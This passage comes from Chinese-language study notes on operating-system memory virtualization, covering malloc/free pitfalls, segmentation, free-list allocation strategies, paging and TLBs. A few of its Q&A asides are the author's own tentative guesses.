<p>由于计算机很贵，需要很多人共用，而不是每人一台；因此 OS 开始需要支持多程序并行；这个时候的办法是引入磁盘的帮助，当需要切换程序的时候，就先将当前内存中的数据保存在磁盘里，然后加载另外一个程序；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20200920173144.png"></p>
<p>由于磁盘很慢，上面的方法导致用户需要等待很久，接下来进一步的办法是将内存划分成多个段，每个程序使用其中一个段，然后切换程序的时候，不需要再跟磁盘打交道，只需要从这个段跳到另外一个段即可；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20200920173202.png"></p>
<p>段的技术不错，不过它也引入了一个新的问题，即如何保护程序数据，避免被其他程序非法访问；</p>
<h3 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h3><p>为了解决隔离的问题，操作系统提供了一种虚拟地址空间的约定，在这个约定中，程序拥有巨大的全部内存空间，就像早期系统刚开始时那样，内存中只有一个程序在运行；同时操作系统还引入了地址翻译器，它会将当前进程指令中的虚拟地址，最终翻译为实际的物理地址，然后从该地址中取到数据；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20200920175410.png"></p>
<h2 id="10-插叙：内存操作-API"><a href="#10-插叙：内存操作-API" class="headerlink" title="10.插叙：内存操作 API"></a>10.插叙：内存操作 API</h2><h3 id="内存类型"><a href="#内存类型" class="headerlink" title="内存类型"></a>内存类型</h3><p>C 程度有两种内存类型，一种是栈内存，它会编译器自动分配和回收；还有一种是堆内存，它由用户自行申请分配和自己回收（因此很容易忘了回收）；</p>
<blockquote>
<p>调用函数申请分配堆内存后，函数一般会返回分配好的堆内存的地址，接下来一般需要将这个地址存在在栈中，以便供后续的代码使用；</p>
<p>问：使用 malloc 分配内存时，返回的地址，是在编译期间，由编译器给出的，还是在指令执行期间，由操作系统给出的？</p>
<p>答：猜测可以由编译器给出；执行期间，操作系统分配的是物理内存，返回的是物理地址，并且也只是将物理地址写入到页表当中完成映射而已，并不需要返回给应用程序；理论上编译器管理着整个虚拟地址空间；</p>
</blockquote>
<h3 id="malloc-调用"><a href="#malloc-调用" class="headerlink" title="malloc() 调用"></a>malloc() 调用</h3><p>malloc 用来申请在堆上分配内存</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="comment">// 使用示例，一般不直接给 malloc 传递 size 字面值，而是通过 sizeof 表达式来获得 size 值，以避免出现错误</span></span><br><span class="line"><span class="type">double</span> *d = (<span class="type">double</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">double</span>));</span><br></pre></td></tr></table></figure>

<h3 id="free-调用"><a href="#free-调用" class="headerlink" title="free() 调用"></a>free() 调用</h3><p>free 用来释放堆上的内存，只需将指针作为参数传递给它即可；</p>
<blockquote>
<p>好奇：为什么 free 只需指针，无须 size_t 参数，即可知道应该回收多大的内存空间？</p>
<p>答：因为在分配该内存块时，在其头部有存储着一些额外的信息，其中一项记录着当前内存块的大小。这意味着实际分配的空间比申请时更大一点点；分配完了后返回的指令实际上并不是指向整个内存块的起始位置，而是在中间，即头部信息之后；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20200925082540.png"></p>
</blockquote>
<h3 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h3><h4 id="忘了分配内存"><a href="#忘了分配内存" class="headerlink" title="忘了分配内存"></a>忘了分配内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例</span></span><br><span class="line"><span class="type">char</span> *src = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *dst; <span class="comment">// 没有分配内存，因此该指针并没有指向堆上的空间，是个空指针</span></span><br><span class="line"><span class="built_in">strcpy</span>(dst, src);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确做法</span></span><br><span class="line"><span class="type">char</span> *src = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *dst = (<span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(src) + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(dst, src);</span><br></pre></td></tr></table></figure>

<h4 id="没有分配足够的内存"><a href="#没有分配足够的内存" class="headerlink" title="没有分配足够的内存"></a>没有分配足够的内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例</span></span><br><span class="line"><span class="type">char</span> *src = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *dst = (<span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(src)); </span><br><span class="line"><span class="comment">// 拷贝字符串时，会在末尾添加结束符，因此长度可能不够，取决于 strlen 返回的值是否包含结束符；</span></span><br><span class="line"><span class="built_in">strcpy</span>(dst, src); </span><br><span class="line"><span class="comment">// 缓冲区溢出可能会成为安全漏洞来源</span></span><br></pre></td></tr></table></figure>

<h4 id="忘记初始化分配的内存"><a href="#忘记初始化分配的内存" class="headerlink" title="忘记初始化分配的内存"></a>忘记初始化分配的内存</h4><p>没有初始化的内存，并不意味着里面没有值，里面有时候会有前人留下的值，结果导致读取到的内容造成了程序错误</p>
<h4 id="忘记释放内存"><a href="#忘记释放内存" class="headerlink" title="忘记释放内存"></a>忘记释放内存</h4><p>如果没有释放内存，则程序在长时间运行后，由于反复分配内存，最终有可能造成内存溢出；</p>
<h4 id="在用完之前就释放内存"><a href="#在用完之前就释放内存" class="headerlink" title="在用完之前就释放内存"></a>在用完之前就释放内存</h4><p>读取的时候很可能会出现预期之外的值；</p>
<h4 id="反复释放内存"><a href="#反复释放内存" class="headerlink" title="反复释放内存"></a>反复释放内存</h4><p>反复释放同一块的结果不可预期，通常会导致程序崩溃；</p>
<h4 id="错误地调用-free"><a href="#错误地调用-free" class="headerlink" title="错误地调用 free()"></a>错误地调用 free()</h4><p>本来想释放 A 指针指向的内存，结果传入了另外一个错误的值做为 free 的参数，结果意外释放了某处的内存，结果有可能导致程序崩溃；</p>
<blockquote>
<p>由于手工分配内存很容易造成各种错误隐患，因此一般使用 purify 和 valgrind 等第三方工具来帮忙检查代码中可能存在的错误调用（有点像 lint 的去毛作用）；</p>
</blockquote>
<h3 id="底层操作系统支持"><a href="#底层操作系统支持" class="headerlink" title="底层操作系统支持"></a>底层操作系统支持</h3><p>malloc 和 free 并不是系统调用，它们是库调用；但是它们本后的实现需要有系统调用，一般是 brk（参数为地址）和 sbrk（参数为增量）；这两个函数用来移动堆顶的指针；</p>
<p>除了 malloc 外，还有一个 mmap 调用可以用来分配内存，它的分配方式跟 malloc 有所不同，是在 swap 交换区中分配一个匿名的内存区域；</p>
<h3 id="其他调用"><a href="#其他调用" class="headerlink" title="其他调用"></a>其他调用</h3><p>calloc：分配堆内存后，会将其中的内容置 0；</p>
<p>realloc：分配一个比传入的数组更大的内存，并把数组内容拷贝到其中，再返回新内存的地址；</p>
<h2 id="11-机制：地址转换"><a href="#11-机制：地址转换" class="headerlink" title="11.机制：地址转换"></a>11.机制：地址转换</h2><p>CPU 很快，但只有一个，所以它通过分时间段轮流使用的方法来实现共享，为了实现高性能，程序的指令直接送达 CPU 进行处理，操作系统仅在发生系统调用或时钟中断时，才介入处理，以帮忙程序完成一些受限功能或取回硬件的控制权；</p>
<p>内存是存储数据的设备，空间足够大，因此它通过分块使用的方法来实现共享（即空间共享）。在设计内存虚拟化时，也需要考虑高性能、安全可控和简单易用的设计目标；它的实现办法是引入地址转换，即抽象一套足够大的虚拟地址空间，由各个程序专用，这样一来就保证了程序在使用内存时的简单易用和安全可控的目标；之后操作系统通过虚拟地址和物理地址的映射表，来和实际的物理内存打交道，程序则完全不用管。</p>
<h3 id="基址-界限机制"><a href="#基址-界限机制" class="headerlink" title="基址+界限机制"></a>基址+界限机制</h3><p>早期的地址转换使用基址加界限的机制（也叫动态重定位）来实现，CPU 里面增加基址和界限两个寄存器，实际的物理地址 &#x3D; 虚拟物理地址 + 基址，之后再用界限寄存器的值进行核验，避免程序访问的地址越过了允许的边界；</p>
<h3 id="硬件支持"><a href="#硬件支持" class="headerlink" title="硬件支持"></a>硬件支持</h3><p>为了实现地址转换，需要硬件提供一些内置功能的支持，包括：</p>
<ul>
<li>区分运行模式：只有在内核模式下，才能运行特权指令；</li>
<li>基址&amp;界限寄存器：用来存放相应的值；</li>
<li>能够转换地址并校验界限</li>
<li>提供修改基址&amp;界限寄存器的指令：以便操作系统可以为每个进程初始化该值；</li>
<li>可在硬件中注册异常处理的特权指令的地址：以便操作系统可以告知 CPU，在发生异常后，应该去哪些地址加载异常处理指令；</li>
<li>提供异常触发机制：以便在进程试图调用特权指令或者访问越界的内存时，能够触发异常；</li>
</ul>
<h3 id="操作系统支持"><a href="#操作系统支持" class="headerlink" title="操作系统支持"></a>操作系统支持</h3><p>为了实现地址转换，需要操作系统提供一些功能的支持，包括：</p>
<ul>
<li>内存管理：为新进程分配内存、回收已结束进程的内存、更新可用内存表；</li>
<li>基址&amp;界限管理：在切换进程时，正确的设置寄存器中的值；</li>
<li>异常处理：提供异常处理指令，以便当异常被触发时，CPU 可以进行调用；</li>
</ul>
<blockquote>
<p>虽然基址+界限的地址转换方式实现起来很简单，但是它也有很大的局限性，即对内存的利用效率比较低，每个进程内部都有大量的空闲内存（即所谓的内部碎片）；</p>
<p>原因在于应用程序有大有小，对内存有不同的需求，在操作系统在一开始的时候，并不知道应该给应用程序分配多少内存比较合理；</p>
</blockquote>
<h2 id="12-分段"><a href="#12-分段" class="headerlink" title="12.分段"></a>12.分段</h2><blockquote>
<p>如何解决基址&amp;界限机制下的空间浪费问题？</p>
</blockquote>
<h3 id="分段：泛化的基址-界限"><a href="#分段：泛化的基址-界限" class="headerlink" title="分段：泛化的基址&amp;界限"></a>分段：泛化的基址&amp;界限</h3><p>虚拟地址空间通常遵守惯例对内容进行分段，至少包括：代码段、堆、栈等三段；这三段占用的空间大小不同，代码段是固定大小的，而堆、栈是动态大小的；因此，为了避免普通基址界限机制下的空间浪费问题，可以做进一步细分，引入多个基址界限，分别用于对应不同的段；当需要对某段内的虚拟地址进行转换时，只要先计算出该地址相对于段起始地址的偏移量，之后加上段基址在映射表中的物理地址，即是它在物理内存中的真实地址（当然，还需要使用界限值检查一下，如果超过了范围，就会引发段错误 segmentation fault）；</p>
<blockquote>
<p>接下来的问题是，当 CPU 拿到一个虚拟地址时，如何知道它属于哪个段？因为只有知道属于哪个段，并且知道该段的起始地址，才有办法计算偏移量</p>
</blockquote>
<h3 id="如何知道引用哪个段"><a href="#如何知道引用哪个段" class="headerlink" title="如何知道引用哪个段"></a>如何知道引用哪个段</h3><p>有两种方式可以用来判断虚拟地址属于哪个段</p>
<h4 id="显式的方法"><a href="#显式的方法" class="headerlink" title="显式的方法"></a>显式的方法</h4><p>使用虚拟地址的头两位来判断，例如 00 代表代码段，01 代表堆段，10 代表栈段；虚拟地址拿掉头两位，剩下的即是地址在该段内的偏移量，可以直接和界限比较大小来检验是否越界，并且也可以直接加上基址，获得实际的物理内存地址；</p>
<h4 id="隐式的方法"><a href="#隐式的方法" class="headerlink" title="隐式的方法"></a>隐式的方法</h4><p>通过虚拟地址的来源来实现，当地址来源于程序计数器时，意味着这个地址是代码段中的地址；当地址是基于栈指针或者堆指针的偏移量计算出来的时候，意味着这个地址是栈地址或者堆地址；</p>
<h3 id="如何处理栈的反向增长"><a href="#如何处理栈的反向增长" class="headerlink" title="如何处理栈的反向增长"></a>如何处理栈的反向增长</h3><p>其实也很简单，当知道了该地址是一个栈地址后，只需要减去栈的起始地址，即可以得到一个负数的偏移量，然后加上基址，即可以得到实际的物理内存地址；</p>
<blockquote>
<p>说明栈空间在物理内存中也是反向增长的；</p>
</blockquote>
<h3 id="支持共享"><a href="#支持共享" class="headerlink" title="支持共享"></a>支持共享</h3><p>不同的进程之间，总是难免会使用到一些相同的数据，例如共享库，如果每个进程都存储一份，显然太浪费空间了。通过引入共享段，可以提高内存的使用效率；</p>
<p>实现办法就是给段地址增加几个位（即保护位），用来标记关于该段是否允许共享、是否可执行等一些额外的信息；如此一来，也给 CPU 增加了一些额外的工作，除了做前述检查虚拟地址是否越界外，还需要检查一下当前指令是否跟标记位有冲突，例如指令尝试向只读的段写入数据，或者尝试运行非执行段中的指令等；</p>
<h3 id="段的颗粒度"><a href="#段的颗粒度" class="headerlink" title="段的颗粒度"></a>段的颗粒度</h3><p>按代码、栈、堆的方式进行分段，是一种比较粗颗粒度的分段；在早期有些系统的设计中，曾经尝试过更加细颗粒度的分段，当时的目的是为了让内存的使用更加高效，当然，分段越多，意味着需要硬件的支持才可行。</p>
<h3 id="操作系统支持-1"><a href="#操作系统支持-1" class="headerlink" title="操作系统支持"></a>操作系统支持</h3><p>虽然分段的方法减少了内存的浪费，提高了使用效率；但是随着进程的不断创建和销毁，物理内存上将存在着越来越来的内存碎片，这些碎片加起来很大，但是它们却是不连续的。这有可能造成明明还有足够多的空闲内存，但却无法满足新建进程的连续性要求。这时候操作系统需要引入一个算法来管理这些碎片，一方面解决如何为新进程找到最合适的空闲内存片段，另一方面负责整理碎片，通过移动已分配内存，让整个内存使用变得紧凑，大部分的非连续碎片能够挨到一起，形成整段的连续内存，从而减少碎片的存在。</p>
<p>管理内存的算法有很多，成百上千，例如最佳匹配、最差匹配、首次匹配等，不过它们只能是尽量减少碎片的产生，暂时还无法完全消除它（因为那意味着要付出其他方面的代价）；</p>
<blockquote>
<p>虽然粗颗粒度段的方式部分解决了内存使用效率问题，但其实它并不能完全解决，因为对堆的高效使用，依赖于进程本身在虚拟地址空间中的管理算法。有可能某个进程所用的算法并不高效，导致用的堆空间很多，但其实很稀疏，这无形中就意味着物理空间的浪费</p>
</blockquote>
<h2 id="13-空闲空间管理"><a href="#13-空闲空间管理" class="headerlink" title="13.空闲空间管理"></a>13.空闲空间管理</h2><blockquote>
<p>待解决问题：如何让碎片最小化？</p>
</blockquote>
<h3 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h3><p>为了方便讨论内存管理算法的实现，先做一些简单的基本假设：</p>
<ul>
<li>已分配内存在生命周期内大小不变；</li>
<li>内存分配后就不再被移动；</li>
<li>已分配内存是一块连续的区域；</li>
</ul>
<h3 id="底层机制"><a href="#底层机制" class="headerlink" title="底层机制"></a>底层机制</h3><h4 id="分割与合并"><a href="#分割与合并" class="headerlink" title="分割与合并"></a>分割与合并</h4><p>当申请分配的内存比某个空闲块小时，内存分配程序就会对空闲块进行分割；</p>
<p>当释放某个已分配的内存块时，内存分配程序会尝试合并，即先检查一下该内存块前后的内存块是否是空闲的，如果是的话，就跟它们合并成一个更大的空闲内存块；</p>
<h4 id="记录已分配空间的大小"><a href="#记录已分配空间的大小" class="headerlink" title="记录已分配空间的大小"></a>记录已分配空间的大小</h4><p>当用户在调用 malloc 分配一块新的内存块时，实际分配的大小并不是用户传递的 size_t 参数，而是比它还要大上一点点，因为内存分配程序需要一个额外的头部空间来存储关于当前内存块的一些元信息，例如 size_t 和 magic number；当后续释放该内存块时，这个头部信息将派上用场。它使得用户在调用 free 函数释放内存时，只须传入指针，而无须传入 size；free 会自动根据指针值倒推（减去 header_t）得到真正的起始位置和实际大小；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20200925083053.png"></p>
<h4 id="空闲链表"><a href="#空闲链表" class="headerlink" title="空闲链表"></a>空闲链表</h4><p>空闲链表是一种数据结构，它保存着哪些内存块是空闲的信息，每个内存块在链表中用一个 node 节点来表示，多个 node 相互连接就形成了空闲链表；每个 node 有两个属性，一个是 size，保存着当前内存的大小信息；一个是指向下一个 node 的指针值；</p>
<p>由于空闲链表用来管理空闲内存，而它自己又是需要内存存储的，因此它的每个节点信息实际是保存在每个空闲内存块的头部里面；</p>
<h4 id="堆的增长"><a href="#堆的增长" class="headerlink" title="堆的增长"></a>堆的增长</h4><p>大多数内存分配程序在开始只是通过系统调用向操作系统申请一块很小的堆，然后随着时间的推进，如果当前已分配的堆确实已经不够用了（做了各种努力之后，例如已经紧凑过了），分配程序会再次发起系统调用，向操作申请更多的堆空间；操作系统在收到请求后，会分配一块空闲的物理内存页，并将该物理内存的地址，映射到进程的虚拟地址空间中；之后进程就有了更大的堆可以使用了；</p>
<blockquote>
<p>问：如果进程的堆是分两次单独申请的，如果操作系统前后给的两个物理空闲页是不连续的，接下来在进行地址转换时，要如何处理？</p>
<p>答：操作系统使用一个页表来记录映射关系，在做地址转换时，查询该页表，得到正确的物理地址；</p>
</blockquote>
<blockquote>
<p>问：此处的分配程序，貌似其实是编译器？因为貌似没必要在程序运行期间，去找一个运行时库来管理已分配的内存？</p>
</blockquote>
<h3 id="基本策略"><a href="#基本策略" class="headerlink" title="基本策略"></a>基本策略</h3><h4 id="最佳匹配"><a href="#最佳匹配" class="headerlink" title="最佳匹配"></a>最佳匹配</h4><p>遍历整个空闲链表，找到和申请大小最接近的空闲内存块；</p>
<p>优点：最佳匹配，空间浪费最小化；</p>
<p>缺点：遍历比较费时，因此分配时间较久；</p>
<h4 id="最差匹配"><a href="#最差匹配" class="headerlink" title="最差匹配"></a>最差匹配</h4><p>遍历整个空闲链表，找到最大的块，分割它；</p>
<p>优点：一无是处，只有初衷是好的（它的初衷是想让可用的空闲块尽量的大）；</p>
<p>缺点：遍历费时，碎片还很多；</p>
<h4 id="首次匹配"><a href="#首次匹配" class="headerlink" title="首次匹配"></a>首次匹配</h4><p>在找到第一个大小满足要求的块后，就不再往下找了；</p>
<p>优点：快，无须遍历；</p>
<p>缺点：链表头部碎片特别多，后续查找的时间开始变长</p>
<h4 id="下次匹配"><a href="#下次匹配" class="headerlink" title="下次匹配"></a>下次匹配</h4><p>比其他策略多维护一个字段，用来记录上次命中后的位置，然后下一次从那里接着往后找；</p>
<p>优点：性能与首次匹配接近，但碎片更平均化，不会集中在头部；</p>
<h3 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h3><h4 id="分离空闲链表"><a href="#分离空闲链表" class="headerlink" title="分离空闲链表"></a>分离空闲链表</h4><p>理论上用户每次申请的内存块的大小是不可预知的。但是由于局部性原理，代码对内存空间的使用不可避免存在某些规律，例如某种大小的内存块被申请的次数最多；因此，可以通过单独增加一个专门维护固定大小的块的链表；只要申请的内存块大小等于某个固定值，就交给这个专门的链表来分配；由于每个内存块的大小都是一样的，而且也无须合并，因此块的分配和释放，都可以在常数时间内完成，效率非常高；同时空间也不怎么浪费；</p>
<blockquote>
<p>感觉这里开始有点分页的思想了！</p>
</blockquote>
<p>沿着这个思路继续往下开展，可以统计出那些最常用的块的大小，通过增加维护跟该大小一致的链表，来进一步提高内存使用效率；</p>
<h4 id="伙伴系统"><a href="#伙伴系统" class="headerlink" title="伙伴系统"></a>伙伴系统</h4><p>伙伴系统将整个内存想象成一个巨大的 2 的 N 次方的空间；每当有一个新的分配请求时，就将空间反复进行二分，直到再次二分便无法满足请求时为止；</p>
<p>它的好处在于，当某个块被释放时，它马上可以检查旁边同等大小的伙伴是否空闲，如果空闲，马上就可以进行合并；合并后以后，再次检查伙伴，以此类推；因此它的合并是非常迅速的；而正因为了合并效率高，使得空间的外部碎片变少；但是内部碎片会多一些（因为不是每个请求都刚好是 2 的幂）；</p>
<h4 id="其他想法"><a href="#其他想法" class="headerlink" title="其他想法"></a>其他想法</h4><p>有些策略的空间利用率高，但付出的代价是查找比较慢；为了进一步压榨提升性能，人们不惜通过牺牲简单性引入复杂性来换取性能，包括使用平衡二叉树、伸展树和偏序树等算法；</p>
<blockquote>
<p>事实上并不存在一个完美而万能的分配程序，因为计算机被用于处理非常多完全不同类型的任务，每种任务都有其各自的业务特点；当对业务特点了解得越多的时候，才有可能选用越合适的分配策略，以大幅度的提高性能；</p>
</blockquote>
<h2 id="14-分页：简介"><a href="#14-分页：简介" class="headerlink" title="14.分页：简介"></a>14.分页：简介</h2><p>操作系统有两种管理物理内存的方法：</p>
<ul>
<li>参照虚拟内存的方法，将物理内存进行不同长度的分段；缺点：随着时间的推移，很容易形成碎片化，分配工作变得越来越困难；</li>
<li>按固定的长度单位，将物理内存分成 N 个单元（每个单元称为一个页）；优点：内存分配比较简单和灵活，因此每个虚拟空间中的页，刚好也映射物理内存中的一个页（通过页表来实现映射）；</li>
</ul>
<blockquote>
<p>由于内存映射是以页为单位的，因此在进行地理转换时，只需转换头部的页号即可，页内的偏移地址并不需要转换；</p>
</blockquote>
<h3 id="页表存储在哪里"><a href="#页表存储在哪里" class="headerlink" title="页表存储在哪里"></a>页表存储在哪里</h3><p>页表还是挺大的，例如对于32位的地址空间，每个页设置为 4 KB，因此需要单个页占用了 12 个位，剩下的 20 个位即是页号；每个页面条目假设占用 4 个字节，单个进程的页表大小为 2^20 * 4 字节，相当于 4 MB；</p>
<p>如果操作系统当前运行着 100 个进程，则总共要使用 400 MB 的物理内存空间来保存页表；这么大的存储量，显然无法保存在 CPU 中，因此通常是将其保存在物理内存中；</p>
<blockquote>
<p>分页的代价是引入页表，额外消耗了一些存储空间，但换来了简单性和灵活性，也避免了碎片的问题；而在分段的机制中，是不需要页表的；同时分页也牺牲了一点性能，因为现在地址转换工作增加查询页表的环节；</p>
</blockquote>
<h3 id="页表中究竟有什么"><a href="#页表中究竟有什么" class="headerlink" title="页表中究竟有什么"></a>页表中究竟有什么</h3><p>简化的来看，可以将页表当做一个巨大的数组，以虚拟页号做为索引，来访问其中的元素，元素包含的值除了物理页号外，还有一些额外的位，这些位分别起到不同的控制作用，包括：</p>
<ul>
<li>有效位：表示是否有数据；</li>
<li>存在位：表示是否被交换到磁盘；</li>
<li>保护位：表示操作权限，例如只读、可写、可执行；</li>
<li>参考位：表示是否被频繁访问，如果是，则应该尽量保存在内存中，避免交换到磁盘；</li>
<li>脏位：表示页面放到内存中了后，是否有被修改过；</li>
<li>其他一些缓存用的位：如 PWT, PCD, PAT, G 等；</li>
</ul>
<h3 id="分页的性能代价"><a href="#分页的性能代价" class="headerlink" title="分页的性能代价"></a>分页的性能代价</h3><p>虽然页表的设计让地址转换变得简单了起来，但是以牺牲部分性能为代价的；因为每一次内存引用，都需要做如下的地址转换计算：</p>
<ul>
<li>从虚拟地址提取虚拟页号；</li>
<li>根据页表基址寄存器存储的基址，以虚拟页号为索引，获得物理页号；</li>
<li>根据物理页号从物理内存中读取数据；</li>
</ul>
<blockquote>
<p>CPU 每执行一条指令之前，都需要先从内存中读取指令，之后才知道指令要执行的内容；而指令中可能含有从内存中读取数据或者更新数据的操作，此时 CPU 将需要再做一次内存的操作，以便得到数据或者写入数据；</p>
<p>CPU 在程序计数器中存储着下一条指令的地址，在执行指令前，先从该地址将指令加载到 CPU 中，然后解读指令，并进行相关的操作；</p>
</blockquote>
<p>除了性能外，分页的另外一个代价是占据较大的物理内存空间；</p>
<blockquote>
<p>线性的单级页表确实比较大，但貌似可以通过非线性的多级页表来解决空间占用过大的问题？</p>
</blockquote>
<h2 id="15-分页：快速地址转换-TLB"><a href="#15-分页：快速地址转换-TLB" class="headerlink" title="15.分页：快速地址转换 TLB"></a>15.分页：快速地址转换 TLB</h2><p>分页固然带来了映射的极大简化，但是如果每执行一条指令，都需要读取物理内存中的页表来作地址转换，这将付出巨大的性能代价，为了弥补这个缺点，一般通过给地址转换器引入缓存来解决，利用局部性原理，减少对物理内存中页表的访问次数，提高地址转换速度；</p>
<h3 id="TLB-的基本算法"><a href="#TLB-的基本算法" class="headerlink" title="TLB 的基本算法"></a>TLB 的基本算法</h3><p>在得到一个虚拟地址后，地址转换器先检查缓存中是否已经有映射条目，如果有则缓存命中，马上可以读取缓存，得到物理页号；如果没有，则需要访问一次物理内存中的页表，将条目写入缓存，之后再重新执行转换（第二次执行可以触发缓存命中）</p>
<blockquote>
<p>TLB 全称：Translation Lookaside Buffer</p>
</blockquote>
<p>单页的尺寸越大，则缓存命中率就会越高；因为最小加载单位是一个页，如果这个页足够大，则接下来要访问的数据，很可能都在这个页中，一般单页的典型大小为 4KB；</p>
<h3 id="如何处理-TLB-未命中"><a href="#如何处理-TLB-未命中" class="headerlink" title="如何处理 TLB 未命中"></a>如何处理 TLB 未命中</h3><p>有两种处理办法：</p>
<ul>
<li>硬件办法：由 CPU 自行处理；这种办法会增加 CPU 设计的复杂性，因为 CPU 需要执行一些自己的代码（指令）并知道页表在物理内存中的位置和格式，因此需要设计较为复杂的指令集 CISC；</li>
<li>软件办法：由 OS 来处理；这种办法增加了灵活性，OS 可以使用任意数据结构，不像 CPU 一出厂就写死了；另外也让 CPU 的设计变简单了，只需要设计较简单的指令集，即 RISC；</li>
</ul>
<blockquote>
<p>随着 CPU 芯片集成的电路变得越来越大，两种指令集的差异消失了，复杂指令集现在运行起来跟简单指令集一样快；</p>
</blockquote>
<h3 id="TLB-的内容"><a href="#TLB-的内容" class="headerlink" title="TLB 的内容"></a>TLB 的内容</h3><p>TLB 是缓存，因此也可以看做是一个数组，这些数组的元素是无序的，每一个元素是一条 TLB 记录，记录中保存着某个虚拟地址和物理地址的映射；由于它们是无序的，因此每条记录中需要同时保存虚拟页号 VPN 和物理页号 PFN，不然仅有一堆物理页号则完全不知道它们属于哪个虚拟页号的了；</p>
<p>除了 VPN 和 PFN 外，一条 TLB 记录中还有几个额外的位来存储一些额外的信息，例如：</p>
<ul>
<li>有效位：用来判断当前记录中的映射信息是否有效，这样在切换进程时，只需将有效位全部设置为无效即可，无需删除整条记录；这样就可以避免当前进程使用上一个进程的映射了（重置缓存中所有条目的有效位也是一个不小的工作，因此还有另外一种办法是引入地址空间标识符，来判断当前进程是否匹配）；</li>
<li>保护位：用来标记该页的内容的访问权限，例如是只读、可写，还是可执行等；</li>
</ul>
<blockquote>
<p>另外还有一些其他位如地址空间标识符、脏位等；</p>
</blockquote>
<h3 id="上下文切换时-TLB-的处理"><a href="#上下文切换时-TLB-的处理" class="headerlink" title="上下文切换时 TLB 的处理"></a>上下文切换时 TLB 的处理</h3><p>一种方案是直接重置所有有效位为 0，这种方法可以确保新进程不会访问旧进程的映射，但是它的缺点是性能开销很大；解决的办法是通过引入地址空间标识符（一般是8个位），来代表不同的进程，这样在切换时，就不需要重置了，但是在搜索时，需要增加对这个标识符的判断，只有标识符 和 VPN 都匹配时，才是缓存命中；</p>
<h3 id="TLB-替换策略"><a href="#TLB-替换策略" class="headerlink" title="TLB 替换策略"></a>TLB 替换策略</h3><p>有两种可用策略：</p>
<ul>
<li>最小引用策略：即将最近最少使用的 TLB 换出；优点是尽量保持高命中率；缺点是偶尔会出现极端情况；</li>
<li>随机策略：随便选择一项换出；不会出现极端情况，但整体命中率有所降低；</li>
</ul>
<h3 id="实际系统的-TLB-表项"><a href="#实际系统的-TLB-表项" class="headerlink" title="实际系统的 TLB 表项"></a>实际系统的 TLB 表项</h3><p>此处是 MIPS R4000 操作系统来举例，在这个操作系统的设计中，使用软件来管理 TLB；因此在遇到缓存没有命中时，需要用到操作系统提供的关于更新 TLB 的一些指令；</p>
<p>该系统单个 TLB 记录有 64 个位，其中：</p>
<ul>
<li>有 19 位用来存 VPN（正常是20位，但因为地址空间有一半被预留给内核，因此实际的用户空间只用 19 位即可表示）；</li>
<li>有 24 位用来存 PFN（因为可以支持最大 2^24 的地址空间，约为 64GB 的物理内存）；</li>
<li>有 1 个 G 位用来表示当前的记录是否是全局的，如果是的话，则不用检查地址空间标识符；</li>
<li>有 8 位用来存储地址空间标识符；</li>
<li>有 3 位用来表示一致性；</li>
<li>有 1 个 D 位（脏位）用来表示记录是否被改写过；</li>
<li>有 1 个 V 位（有效位）用来表示当前记录的内容是否有效；</li>
<li>剩下的都是一些暂未使用的位；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201013095414.png"></p>
<p>MIPS 的 TLB 一般总共有 32 个记录或者 64 个记录；大多数留给用户进程使用，但它有一个寄存器，可以用来设置有多少个记录需要预留给内核使用；在这些预留的记录中的映射，用来保存操作系统自己在某些时刻下要用的代码和数据；</p>
<h2 id="16-分布：较小的表"><a href="#16-分布：较小的表" class="headerlink" title="16.分布：较小的表"></a>16.分布：较小的表</h2><p>简单数组结构的单级线性页表带来的一个问题是占用空间过大，因此需要寻找新的办法，例如通过以时间换空间的方法，来解决内存占用过大的问题。</p>
<h3 id="方法一：更大的页"><a href="#方法一：更大的页" class="headerlink" title="方法一：更大的页"></a>方法一：更大的页</h3><p>由于地址长度是固定的，因此如果单页变大，则页号的范围变小，因此页表的记录数也随之变少，这样页表就变小了；例如对于 32 位地址，单页设计为 12 位，此时单页的大小为 2^12 字节，约为 4KB，页表条目需要 20 位，因此有 2^20 个条目，每个条目有 4 字节，总共需要 4MB；如果将单页设计为 14 位，大小变成 16 KB，则页表条目只需 2^18 个，少了 4 倍，变成 1MB；</p>
<p>结果看上去不错，占用空间只剩下 1MB 了，而且还提高了缓存命中率；但其实这是以增加单页的内部碎片为代价的，即每次为进程分配内存时，最小单位都是 16KB，但它实际上可能常常用不了这么多，因此造成了很多内部空间浪费；</p>
<blockquote>
